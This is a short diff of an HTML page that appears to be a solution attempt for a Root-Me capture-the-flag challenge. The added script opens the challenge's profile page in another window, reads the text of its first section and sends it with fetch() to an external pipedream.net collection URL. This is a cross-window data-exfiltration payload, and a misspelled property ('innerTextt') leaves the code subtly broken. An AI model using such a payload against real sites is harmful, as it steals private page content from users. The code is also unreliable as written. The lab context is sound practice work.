@@ -3,7 +3,9 @@
 <body>
 
 <script>
-	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=', {mode: 'no-cors'})
+	var aaa = open('http://challenge01.root-me.org:58003/profile', 'target')
+
+	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?c=' + aaa.window.document.getElementsByTagName('section')[0].innerTextt, {mode: 'no-cors'})
 </script>
 
 </body>
